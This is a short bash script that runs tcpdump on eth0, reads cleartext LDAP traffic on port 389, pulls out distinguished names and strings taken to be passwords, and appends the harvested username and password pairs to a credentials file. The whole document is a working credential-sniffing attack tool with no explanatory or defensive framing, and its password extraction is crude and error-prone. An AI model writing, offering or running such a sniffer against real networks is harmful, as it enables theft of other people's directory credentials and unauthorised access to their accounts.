#!/bin/bash
#saved to 
OUTPUT_FILE="/ldap_credentials.txt"
#Capture Network Traffic
tcpdump -i eth0 -A port 389 | while read -r line; do
    USERNAME=$(echo "$line" | grep -oE "cn=[^,]+,dc=[^,]+,dc=[^ ]+")
    PASSWORD=$(echo "$line" | grep -oE "[[:print:]]{4,}" | tail -1)  
    if [[ ! -z "$USERNAME" && ! -z "$PASSWORD" ]]; then
        echo -e "Username: $USERNAME\nPassword: $PASSWORD\n" | tee -a "$OUTPUT_FILE"
    fi
done
